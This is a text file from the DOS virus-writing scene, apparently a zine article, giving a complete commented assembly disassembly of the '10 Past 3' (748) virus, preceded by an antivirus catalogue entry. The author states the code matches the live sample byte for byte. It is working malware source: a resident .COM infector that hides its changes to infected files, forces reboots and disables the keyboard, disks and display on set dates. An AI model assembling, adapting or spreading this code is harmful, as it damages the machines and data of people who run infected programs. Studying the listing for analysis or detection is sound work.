                        ============================ 
                          Disassembly of 10 Past 3
                          By The Attitude Adjuster                        
                        ============================ 
 
        Well... I was bored, and, I am still relatevly bad at doing
 disassemblies, so, I thought I'd do a seemingly interesting virus, and
 do it well...

        First, what Patti says...
 
 ===========================================================================
 Virus Name:  10 Past 3
 Aliases:     748
 V Status:    Rare
 Discovery:   1991
 Symptoms:    .COM file growth; keyboard keypresses altered; system reboots;
              hardware devices disabled or interference
 Origin:      Unknown
 Eff Length:  748 Bytes
 Type Code:   PRaCK - Parasitic Resident .COM Infector
 Detection Method:  CPAV 1.4+, AVTK 6.0+, F-Prot, IBMAV, Iris, Panda, VNet,
                    VBuster 3.93+, ViruScan V99+, Sweep 2.43a+, Trend,
                    AllSafe, ViruSafe, NAV 2.1.2+, UTScan 25.10+, Vi-Spy,
                    CPAV/N, LProt, NShld V99+, Sweep/N
 Removal Instructions:  Delete infected files

 General Comments:
       The 10 Past 3, or 748, virus was submitted in November, 1992.  This
       virus was actually isolated much earlier, in early 1991.  10 Past 3
       is a memory resident infector of .COM programs, including
       COMMAND.COM.

       The first time a program infected with the 10 Past 3 virus is
       executed, this virus will install itself memory resident in low
       available system memory, hooking interrupts 21 and 6B.  Total
       system and available free memory, as measured by the DOS CHKDSK
       program, will not be altered.

       Once the 10 Past 3 virus is memory resident, it will infect .COM
       programs, including COMMAND.COM, when they are executed.  Infected
       programs will have a file length increase of 748 bytes with the
       virus being located at the end of the file.  The program's date and
       time in the DOS disk directory listing will not be altered.  No
       text strings are visible within the viral code.

       The 10 Past 3 virus activates between 15:10 and 15:13 (3:00PM and
       3:15PM) every day, at which time it will cause the "Ctrl" or "Shift"
       keys to be invokes occassionally when the system user enters a
       character on the system keyboard.  As a result, the character input
       may not be the same as what the user intended.  Additionally, it
       either disables or interfers with the functioning of the following
       devices on the days of any month indicated below:

                1st day of any month - keyboard
               10th day of any month - system hard disk
               16th day of any month - system monitor/display
               29th day of any month - disk drives

       On the 22nd day of any month, unexpected system reboots may occur.

       Known variant(s) of 10 Past 3 are:
       10 Past 3-B: A 789 byte variant of the 10 Past 3 virus, this
                    variant adds 789 bytes to the .COM programs it infects,
                    including COMMAND.COM.  It will occassionally display
                    the following text on the system monitor:
                    "Therese"
                    The text is visible within the viral code in all
                    10 Past 3-B infected programs.
                    Origin:  Republic Of South Africa  January, 1993.
 
 ===========================================================================
        Now, allow me to quote from the woman who can't write...
       
      'The 10 Past 3 virus activates between 15:10 and 15:13 (3:00PM and
       3:15PM) every day, at which time it will cause the "Ctrl" or "Shift"'

        Sheesh, Patti, grow a little programming knowledge, and maybe learn
 how to read military time!

        Anyway, here's the code, hope you like it... I found it to be a
 thoroughly boring piece of code, 'cept for a few little things, just angles
 I had yet to look from... As always, this is byte for byte with the sample
 that I worked from... Scans as it, must be it ("Look man, RedX!" Ha!)...
 
 ===========================================================================
.model tiny  
.code

; 10 Past 3, Disassembly done by The Attitude Adjuster for ID Issue 3.
; All hail the holy XCHG AX,AX!        
        
        org     100h

start:
        db      0E9h, 1Dh, 00                           ; jmp near intovirus
        db      0B4h, 09h                               ; mov ah, 9
        int     21h
        int     20h
        nop                                             ; F!#K
        nop                                             ; F!#K
        nop                                             ; F!#K
        nop                                             ; F!#K
        nop                                             ; F!#K
        nop                                             ; F!#K
        nop                                             ; F!#K
hello   db      'Hello world !', 0Dh, 0Ah, '$'

intovirus:
        jmp     short furtherintovirus
        nop                                             ; F!#K
saved2:        
        db       0Ah, 24h
jumpnear:
        db      0E9h, 1Dh, 00h
sizestore:        
        db       20h, 00h
attribs:        
        db       20h
filetime:        
        db       42h, 8Fh, 51h, 15h
what:        
        db       01h, 00h
what2:        
        db       00h, 00h
old24:        
        db       56h, 05h,0E1h, 33h
        db      00h
fileofs:        
        db       25h, 01h,0C4h, 34h

furtherintovirus:  
        mov     word ptr ds:[100h], 10BAh               ; Replace 1st 3
buffa2:        
        mov     byte ptr ds:[102h], 1                   ; bytes of COM
        
        xor     ax,ax                                   ; Interrupt Table
        mov     ds,ax

        cmp     word ptr ds:[6Bh*4], 4246h              ; check 1st ruthere
        jne     installus

        cmp     word ptr ds:[6Bh*4+2], 2206h            ; check 2nd ruthere
        je      alreadyinstalled

installus:  
        call    installvirusinmemory
        jmp     short alreadyinstalled
        nop                                             ; F!#K
  
installvirusinmemory:   
        mov     word ptr ds:[6Bh*4], 4246h              ; set RUTHERE's      
        mov     word ptr ds:[6Bh*4+2], 2206h
        
        push    cs                                      ; cs = ds
        pop     ds
        
        mov     ax, 3521h                               ; get int 21h
        int     21h                                     ; vector
        
modme2:        
        mov     si, offset gobackfromwhenceyoucame      ; save int 21h
        mov     [si+1], bx                              ; vector
        mov     [si+3], es
        
        push    es
        push    bx
        
        pop     dx
        pop     ds
        
        mov     ax, 256Dh                               ; int 6dh = int 21h
        int     21h
        
modme1:
        mov     si, offset intovirus
        
        mov     ax, 40h                                 ; bios
        mov     ds, ax
        
        mov     ax, ds:[0013h]                          ; (0040:0013=280h)
        mov     cl, 6
        shl     ax, cl                                  ; shift to segment
        sub     ax, 800h                                ; minus 800 paras
        mov     es, ax                                  ; in ES
        
        xor     di, di                                  ; destination 0
        mov     cx, endofvirus - intovirus              ; ieterations
        
        push    cs                                      ; cs = ds
        pop     ds
        
        rep     movsb                                   ; copy it
        
        mov     ax, 2521h                               ; set int 21h
        push    es
        pop     ds
        mov     dx, int_21_handler - intovirus
        int     21h
        
        mov     si, 17h
        mov     byte ptr [si], 0
        ret
  
alreadyinstalled:
        call    debuggerreboot
        
        push    cs
        push    cs
        
        pop     ds
        pop     es
        
        mov     ax, offset start
        jmp     ax                                      ; advance to go
  
debuggerreboot:
        mov     ax, 0F000h                              ; hi bios
        mov     ds, ax
        
        mov     dx, offset 0FFF0h                       ; ssi = reboot
        mov     ax, 2501h
        int     21h
        
        mov     ax, 2503h                               ; brkpt = reboot
        int     21h
        ret
  
int_21_handler:        
        push    ax
        push    bx
        push    cx
        push    dx
        push    di
        push    si
        push    es
        push    ds
        
        mov     ah, 2Ah                                 ; get date
        int     6Dh
        
        cmp     cx, 7C7h                                ; is year 1991
        jb      datenogood                              ; Jump if below
        
        cmp     dl, 16h                                 ; is date 22nd
        jne     onwardguys                              ; nope

        db      0eah, 0F0H, 0FFH, 00, 0F0H              ; reboot

onwardguys:
        mov     ah, 25h                                 ; set int vector
        
        cmp     dl, 1Dh                                 ; is date 29th
        je      dateisthe29th
        
        cmp     dl, 1                                   ; is date 1st
        je      dateisthe1st
        
        cmp     dl, 0Ah                                 ; is date 10th
        je      dateisthe10th
        
        cmp     dl, 10h                                 ; is date 16th
        je      dateisthe16th
        
        jmp     short datenogood
        
        nop                                             ; F!#K

dateisthe29th:
        mov     al, 13h                                 ; disks
        jmp     short setvector
        nop                                             ; F!#K

dateisthe1st:
        mov     al, 16h                                 ; keyboard
        jmp     short setvector
        nop                                             ; F!#K

dateisthe10th:
        mov     al, 0Dh                                 ; fixed disk
        jmp     short setvector
        nop                                             ; F!#K

dateisthe16th:
        mov     al, 10h                                 ; video

setvector:
        push    cs                                      ; ds = cs
        pop     ds
        mov     dx, bigproblems - intovirus
        int     6Dh

datenogood:
        mov     ax, 40h                                 ; bios
        mov     ds, ax
        
        mov     ax, ds:[006Eh]                          ; clicks since 12AM
        mov     bx, ds:[006Ch]
        
        push    cs                                      ; ds = cs
        pop     ds
        
        mov     si, 0017h                               ; keyboard status
        mov     cl, ds:[si]
        cmp     cl, 1                                   ; only right shift
        je      noactivate
        
        ; this here checks for approximately 3:10 to 3:15 vicinity

        cmp     ax, 0Fh                                 ; timer hi = 0fh
        jne     noactivate
        
        cmp     bx, 2AA8h                               ; timer lo < 2AA8h
        jb      noactivate
        
        cmp     bx, 3774h                               ; timer lo > 3774h
        ja      noactivate
        
        mov     byte ptr [si], 1                        ; right shift only
        
        mov     ax, 3509h                               ; get int 9 vector
        int     21h
        
        push    es
        push    bx
        
        pop     dx
        pop     ds
        
        mov     ax, 256Ah                               ; int 6ah = int 9
        int     21h
        
        push    cs
        pop     ds
        
        mov     dx, int_9_handler - intovirus           ; set our int 9
        mov     ax, 2509h
        int     21h

noactivate:
        pop     ds
        pop     es
        pop     si
        pop     di
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        
        cmp     ah, 4Bh                                 ; execute call?
        je      yeppersitsanexecute

gobackfromwhenceyoucame:                                ; return to int 21h
        db      0EAh                                    ; jmp far ptr 
        db      60h, 14h, 02fh, 02h                     ; old int 21h vector

returntoitall:
        pop     es
        pop     ds
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     short gobackfromwhenceyoucame

okayreamit:
        mov     ax, 2524h                               ; set int 24h
        mov     si, old24 - intovirus
        mov     dx, cs:[si]
        mov     ds, cs:[si+2]
        int     21h
        
        push    cs
        pop     ds
        
        mov     si, filetime - intovirus                ; set file time
        mov     cx, [si]
        mov     dx, [si+2]
        mov     ax, 5701h
        int     21h
        
        mov     ah, 3Eh                                 ; close it up
        int     21h
        
        mov     si, fileofs - intovirus                 ; load address
        mov     dx, cs:[si]
        mov     ds, cs:[si+2]
        
        mov     ax, 4301h                               ; set attribs back
        mov     si, attribs - intovirus 
        mov     cl, cs:[si]
        xor     ch, ch
        int     21h
        
        jmp     short returntoitall

yeppersitsanexecute:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        push    es
        
        mov     ax, 4300h                               ; get attributes
        int     21h
        jc      okayreamit                              ; bad file?

        mov     si, attribs - intovirus                 ; save attribs
        mov     cs:[si], cl
        
        mov     si, fileofs - intovirus                 ; save file address
        mov     cs:[si], dx
        mov     cs:[si+2], ds
        
        mov     ax, 3524h                               ; get int 24h vector
        int     21h
        
        mov     si, old24 - intovirus                   ; save int 24h
        mov     cs:[si], bx
        mov     cs:[si+2], es
        
        mov     ax, 2524h                               ; set int 24h
        push    cs
        pop     ds
        mov     dx, bigproblems - intovirus
        int     21h
        
        mov     si, fileofs - intovirus                 ; reload file addr
        mov     dx, cs:[si]
        mov     ds, cs:[si+2]
        
        mov     ax, 4301h                               ; set attributes
        mov     cx, 20h                                 ; archive
        int     21h
        jc      allpurposeerror                         ; catch criticals

        mov     ax, 3D02h                               ; open for write
        int     21h
        jc      allpurposeerror                         ; more error checks
        
        mov     bx, ax                                  ; F!#K
        
        mov     ax, 5700h                               ; get file time
        int     21h
        jc      allpurposeerror                         ; more error checks!
        
        mov     si, filetime - intovirus                ; save file time
        push    cs
        pop     ds
        mov     [si], cx
        mov     [si+2], dx
        
        mov     ah, 3Fh                                 ; read 2 bytes into
        mov     cx, 2
        mov     dx, (furtherintovirus + 4) - intovirus  ; buffer
        int     21h
        jc      allpurposeerror                         ; damn these checks!
        
        mov     si, (buffa2 - 2) - intovirus
        cmp     word ptr [si], 5A4Dh                    ; misnamed exe ?!?
        je      allpurposeerror                         ; fuckin' checks
        
        mov     ah, 3Fh                                 ; read 1 byte into
        mov     cx, 1
        mov     dx, (furtherintovirus + 10) - intovirus ; buffer
        int     21h
        jc      allpurposeerror                         ; !!!
        
        mov     ax, 4202h                               ; LSeek end
        xor     cx, cx
        xor     dx, dx
        int     21h
        jc      allpurposeerror                         ; AARRRGGGHHH!!!
        
        cmp     dx, 0                                   ; if size > 65535
        jg      allpurposeerror
        
        cmp     ax, 4                                   ; if size < 4
        jb      allpurposeerror
        
        cmp     ax, 0FBF0h                              ; if size > 64496
        ja      allpurposeerror
        
        mov     si, sizestore - intovirus               ; save size
        mov     [si], ax
        
        mov     cx, ax                                  ; size in cx
        
        sub     ax, 3                                   ; mod for jmp near
        
        mov     si, (jumpnear + 1) - intovirus          ; save size - 3
        mov     [si], ax
        
        add     cx, 100h                                ; size + 100h
        mov     si, (modme1 + 1) - intovirus
        mov     [si], cx                                ; modify first delta
        
        add     cx, 151h                                ; size + 251h
        
        mov     si, (modme2 + 1) - intovirus
        mov     [si], cx                                ; modify 2nd delta
        
        jmp     short continueinfect
        nop                                             ; F!#K
allpurposeerror:
        jmp     okayreamit

continueinfect:
        mov     ax, 4200h                               ; LSeek from start
        xor     cx, cx                                  ; Size - 2
        mov     si, sizestore - intovirus
        mov     dx, [si]
        sub     dx, 2
        int     21h
        
        mov     ah, 3Fh                                 ; read 2 bytes
        mov     cx, 2
        mov     dx, saved2 - intovirus
        int     21h
        
        mov     si, saved2 - intovirus                  ; load saved 2
        mov     ax, [si]
        
        cmp     ax, 2206h                               ; infected?
        je      allpurposeerror
        
        mov     ax, 4200h                               ; LSeek start
        xor     cx, cx
        xor     dx, dx
        int     21h
        
        mov     ah, 40h                                  ; write jmp near
        mov     cx, 3
        mov     dx, jumpnear - intovirus
        int     21h
        
        mov     ax, 4202h                               ; LSeek end
        xor     cx, cx
        xor     dx, dx
        int     21h
        
        mov     si, what - intovirus                    ; inc counter
        inc     word ptr [si]
        
        mov     si, what2 - intovirus
        push    word ptr [si]
        mov     word ptr [si], 0
        
        mov     ah, 40h                                 ; write file
        mov     dx, intovirus - intovirus               ; duh!
        mov     cx, endofvirus - intovirus
        int     21h
        
        mov     si, what - intovirus                    ; dec counter
        dec     word ptr [si]
        
        pop     ax                                      ; pop off other valu
        inc     ax
        
        mov     si, what2 - intovirus                   ; save other valu
        mov     [si], ax
        jmp     okayreamit
        
bigproblems:        
        xor     al,al                                   ; a little xtreme?!?
        iret
        
int_9_handler:
        push    ax
        push    ds
        
        mov     ax, 0040h                               ; bios
        mov     ds, ax
        
        mov     ah, byte ptr ds:[006ch]                 ; clicks afta 12 AM
        cmp     ah, 17h                                 ; past time?
        ja      itsallover
        
        and     ah, 6
        or      ds:[0017h], ah                          ; fuck that flag!!!
        
itsallover:
        pop     ds
        pop     ax
        int     6ah
        iret

        db      06h, '"'
endofvirus:
        end     start
 ===========================================================================

        I saw no need to write a stand-alone demonstration for this rather
 unflattering virus,  as  it displays  nothing, and only  disables  device
 access and fucks with the keyboard...
